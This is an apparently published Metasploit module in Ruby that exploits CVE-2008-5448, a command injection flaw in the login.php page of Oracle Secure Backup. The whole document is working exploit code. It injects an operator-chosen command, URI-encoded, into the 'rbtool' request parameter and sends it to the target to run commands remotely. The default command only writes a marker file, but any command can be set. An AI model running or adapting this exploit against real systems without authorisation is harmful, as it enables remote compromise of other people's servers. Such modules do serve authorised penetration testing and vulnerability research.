##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Secure Backup exec_qr() Command Injection Vulnerability',
      'Description'    => %q{
          This module exploits a command injection vulnerablility in Oracle Secure Backup version 10.1.0.3 to 10.2.0.2.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-5448' ],
          [ 'OSVDB', '51342' ],
          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-003' ],
        ],
      'DisclosureDate' => 'Jan 14 2009'))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
        OptBool.new('SSL',   [true, 'Use SSL', true]),
      ], self.class)
  end

  def run

    r = Rex::Text.rand_text_english(2)

    cmd = datastore['CMD']

    uri = "/login.php?clear=no&ora_osb_lcookie=&ora_osb_bgcookie=#{r}&button=Logout&rbtool="

    req = uri + Rex::Text.uri_encode(cmd)

    print_status("Sending command: #{datastore['CMD']}...")

    res = send_request_raw({'uri' => req,},5)

    print_status("Done.")

  end
end
